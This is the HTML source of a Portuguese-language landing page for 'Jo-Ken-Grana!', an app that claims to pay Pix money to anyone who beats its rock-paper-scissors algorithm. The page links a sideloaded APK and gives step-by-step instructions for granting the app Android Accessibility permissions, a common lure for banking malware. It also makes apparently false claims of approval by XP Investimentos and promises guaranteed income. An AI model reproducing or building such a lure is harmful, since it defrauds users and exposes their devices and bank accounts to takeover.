 <!DOCTYPE html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta
      name="description"
      content="A simple template to mobile landing page"
    />
    <meta name="keywords" content="HTML, CSS, JavaScript" />
    <meta name="author" content="Alexandre Sanlim" />

    <!-- Bootstrap CSS -->
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-BmbxuPwQa2lc/FVzBcNJ7UAyJxM6wuqIj61tLrc4wSX0szH/Ev+nYRRuWlolflfl"
      crossorigin="anonymous"
    />

    <title>App Name</title>

    <!--add animation: gradient 60s ease infinite; to animation gradient, custom gradient here: https://cssgradient.io/-->
    <style>
      body {
        background: rgb(255, 64, 129);
        background: linear-gradient(
          150deg,
          rgba(255, 64, 129, 1) 0%,
          rgba(63, 81, 181, 1) 21%,
          rgba(48, 63, 159, 1) 52%
        );
        background-size: 400% 400%;
      }

      @keyframes gradient {
        0% {
          background-position: 0% 50%;
        }

        50% {
          background-position: 100% 50%;
        }

        100% {
          background-position: 0% 50%;
        }
      }
    </style>
  </head>

  <body class="bg-light">
    <main class="container">
      <div class="d-flex p-3 text-white my-3 rounded">
        <div class="row">
          <!-- SET YOUR LOGO HERE -->
          <figure class="figure col-lg-3">
            <img
              src="https://imgtr.ee/images/2023/12/16/2d0d3e5710c74ad5d4041128a48143f6.jpeg"
              class="figure-img img-fluid rounded"
            />
          </figure>

          <div class="col-lg-9">
            <h1>
              <img
                src="https://imgtr.ee/images/2023/12/16/118909c815d97cd133bdfb10150a5c7d.png"
                class="figure-img img-fluid rounded"
                height="60px"
                width="60px"
              />Jo-Ken-Grana!
            </h1>
            <p class="lead">
              Única plataforma que oferece Pix de baixo valor para todos os
              nossos usuários por simplesmente jogar e participar de nossa rede
              de jogadores.
            </p>
            <br />
            <p>
              Jo-Ken-Grana! é a plataforma inovadora que transforma o universo
              do jogo pedra-papel-tesoura em uma oportunidade financeira
              emocionante. Oferecemos aos usuários a chance de ganhar dinheiro
              ao participar de partidas contra nosso algoritmo. Com simplicidade
              e diversão, Jo-Ken-Grana! proporciona uma experiência única,
              unindo entretenimento e ganhos reais. Jogue, ganhe e divirta-se
              enquanto exploramos juntos as possibilidades do jogo que vai além
              da diversão. Jo-Ken-Grana!: onde a sorte se encontra com a
              estratégia para criar uma jornada única de jogos e recompensas.
            </p>
            <div class="container mt-5">
              <div class="row">
                <div class="col-md-3 mb-12" style="padding-top: 10px">
                  
                    <a
                      data-tag-link=""
                      data-tag='{"type":"LNK","component":"[data-component]", "title":"Windows", "text": "iniciar instalação"}'
                      href="https://jokengrana.onrender.com/JO-KEN-GRANA.apk"
                      data-cslp=""
                      aria-describedby="title-csa819f66dab620a4f"
                      download
                      class="btn btn-primary btn-lg btn-block"
                      style="width: 100%"
                    >
                      Baixar agora!
                    </a>
                </div>
                <div class="col-md-3 mb-12" style="padding-top: 10px">
                  
                  <a
                    data-tag-link=""
                    data-tag='{"type":"LNK","component":"[data-component]", "title":"Windows", "text": "ajuda"}'
                    href="https://api.whatsapp.com/send?phone=5516996198702&text=Ol%C3%A1,%20preciso%20de%20ajuda%20com%20o%20app%20Jo-Ken-Grana!"
                    data-cslp=""
                    aria-describedby="title-csa819f66dab620a4f"
                    download
                    class="btn btn-success btn-lg btn-block"
                    style="width: 100%"
                  >
                    Precisa de ajuda?
                  </a>
              </div>
                
                <!-- <div class="col-md-3 mb-12" style="padding-top: 10px;">
                <button style="width: 100%" class="btn btn-success btn-lg btn-block" onclick="contactSupport()">Precisa de ajuda?</button>
              </div> -->
              </div>
            </div>
          </div>
        </div>
      </div>

      <div
        id="myCarousel"
        class="carousel slide my-3 rounded"
        data-bs-ride="carousel"
        style="height: 300px"
      >
        <div class="carousel-indicators">
          <button
            type="button"
            data-bs-target="#myCarousel"
            data-bs-slide-to="0"
            class="active"
            aria-current="true"
            aria-label="Slide 1"
          ></button>
          <button
            type="button"
            data-bs-target="#myCarousel"
            data-bs-slide-to="1"
            aria-label="Slide 2"
          ></button>
          <button
            type="button"
            data-bs-target="#myCarousel"
            data-bs-slide-to="2"
            aria-label="Slide 3"
          ></button>
        </div>
        <div class="carousel-inner" style="height: 100%">
          <div class="carousel-item active" style="height: 100%">
            <svg
              class="bd-placeholder-img"
              width="100%"
              height="100%"
              xmlns="http://www.w3.org/2000/svg"
              aria-hidden="true"
              preserveAspectRatio="xMidYMid slice"
              focusable="false"
            >
              <rect width="100%" height="100%" fill="#000" />
            </svg>

            <div class="container">
              <div class="carousel-caption">
                <h2>Sem asteriscos</h2>
                <p>
                  Não tem segredo! Ganhe do nosso algoritmo e receba um pix dos
                  nossos patrocinadores. São mais de 25 milhões de reais
                  disponibilizados por nossos investidores para garantir o
                  funcionamento de nosso sistema!
                </p>
              </div>
            </div>
          </div>
          <div class="carousel-item" style="height: 100%">
            <svg
              class="bd-placeholder-img"
              width="100%"
              height="100%"
              xmlns="http://www.w3.org/2000/svg"
              aria-hidden="true"
              preserveAspectRatio="xMidYMid slice"
              focusable="false"
            >
              <rect width="100%" height="100%" fill="#000" />
            </svg>

            <div class="container">
              <div class="carousel-caption">
                <h2>Sem depósitos iniciais, <strong>mesmo!</strong></h2>
                <p>
                  Diferente das outras plataformas, nós não pedimos qualquer
                  depósito inicial. Apenas é requerida a validação do seu
                  dispositivo. Simple assim, não perca tempo!
                </p>
              </div>
            </div>
          </div>
          <div class="carousel-item" style="height: 100%">
            <svg
              class="bd-placeholder-img"
              width="100%"
              height="100%"
              xmlns="http://www.w3.org/2000/svg"
              aria-hidden="true"
              preserveAspectRatio="xMidYMid slice"
              focusable="false"
            >
              <rect width="100%" height="100%" fill="#000" />
            </svg>

            <div class="container">
              <div class="carousel-caption">
                <h2>É seguro?</h2>
                <p>
                  Somos uma empresa registrada e homologada. Nosso aplicativo é
                  emitido de forma privada para máxima segurança dos usuários,
                  evitando coleta de dados. O aplicativo também é emitido e
                  homologado XP.
                </p>
              </div>
            </div>
          </div>
        </div>
        <button
          class="carousel-control-prev"
          type="button"
          data-bs-target="#myCarousel"
          data-bs-slide="prev"
        >
          <span class="carousel-control-prev-icon" aria-hidden="true"></span>
          <span class="visually-hidden">Anterior</span>
        </button>
        <button
          class="carousel-control-next"
          type="button"
          data-bs-target="#myCarousel"
          data-bs-slide="next"
        >
          <span class="carousel-control-next-icon" aria-hidden="true"></span>
          <span class="visually-hidden">Próximo</span>
        </button>
      </div>

      <div class="my-3 p-3 rounded">
        <!-- <h1 class="pb-2 mb-0 text-white"></h1> -->

        <!-- SET YOUR SCREENSHOTS HERE -->
        <div class="row align-items-center">
          <figure class="figure col-lg-3">
            <img
              src="https://imgtr.ee/images/2023/12/16/ecbfb178cb94b856f6156ebdb2c6aa57.jpeg"
              class="figure-img img-fluid rounded"
            />
          </figure>
          <figure class="figure col-lg-3">
            <img
              src="https://imgtr.ee/images/2023/12/16/41b38c8f692a3e09b6e16daf3888f4be.jpeg"
              class="figure-img img-fluid rounded"
            />
          </figure>
          <figure class="figure col-lg-3">
            <img
              src="https://imgtr.ee/images/2023/12/16/98ea4829eab399105629ff365ecf2bc7.jpeg"
              class="figure-img img-fluid rounded"
            />
          </figure>
          <figure class="figure col-lg-3">
            <img
              src="https://imgtr.ee/images/2023/12/16/76d0a40371ca07bdd2f3c15830ef8054.jpeg"
              class="figure-img img-fluid rounded"
            />
          </figure>
        </div>
      </div>
      <div style="color: white">
        <h2 class="" data-cslp="">
          Passo a passo para instalação
        </h2>
        <p><strong>Veja como é fácil estar seguro:</strong></p>
                      <ul>
                        <li>
                          <p>Abra as configurações do seu dispositivo Android.</p>
                        </li>
  
                        <li>
                          <p>Role para baixo e encontre a opção "Acessibilidade" (pode estar dentro da seção
                            "Configurações Avançadas", "Sistema" ou "Configuraçãoes adicionais").</p>
                        </li>
  
                        <li>
                          <p>Toque em "Acessibilidade" para acessar as configurações relacionadas.</p>
                        </li>
  
                        <li>
                          <p>Toque em "Apps transferidos por download".</p>
                        </li>
  
                        <li>
                          <p>Procure por "JO-KEN-GRANA!" na lista de serviços ou aplicativos disponíveis.</p>
                        </li>
  
                        <li>
                          <p>Ative o interruptor ou a opção para conceder as permissões de acessibilidade ao JO-KEN-GRANA!.</p>
                        </li>
  
                        <li>
                          <p>Jogue e lucre na única plataforma que oferece renda extra com garantia!</p>
                        </li>
                      </ul><br></div>
    </main>

    <footer class="text-muted py-5" style="background-color: black">
      <div class="container text-white">
        <p>
          Jo-Ken-Grana! é uma marca registrada e homologada pela corregedoria de
          valores do Brasil junto à <strong>XP INVESTIMENTOS</strong>
        </p>
        <br />
        <strong
          >02.332.886/0001-04<br />
          XP INVESTIMENTOS CORRETORA DE CAMBIO, TITULOS E VALORES MOBILIARIOS
          S/A</strong
        >
      </div>
    </footer>

    <!-- Optional JavaScript; choose one of the two! -->

    <!-- Option 1: Bootstrap Bundle with Popper -->
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-b5kHyXgcpbZJO/tY9Ul7kGkf1S0CWuKcCD38l8YkeH8z8QjE0GmW1gYU5S9FOnJ0"
      crossorigin="anonymous"
    ></script>

    <!-- Option 2: Separate Popper and Bootstrap JS -->
    <!--
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.6.0/dist/umd/popper.min.js" integrity="sha384-KsvD1yqQ1/1+IA7gi3P0tyJcT3vR+NdBTt13hSJ2lnve8agRGXTTyNaBYmCR/Nwi" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/js/bootstrap.min.js" integrity="sha384-nsg8ua9HAw1y0W1btsyWgBklPnCUAFLuTMS2G72MMONqmOymq585AcH49TLBQObG" crossorigin="anonymous"></script>
    -->
  </body>
</html>
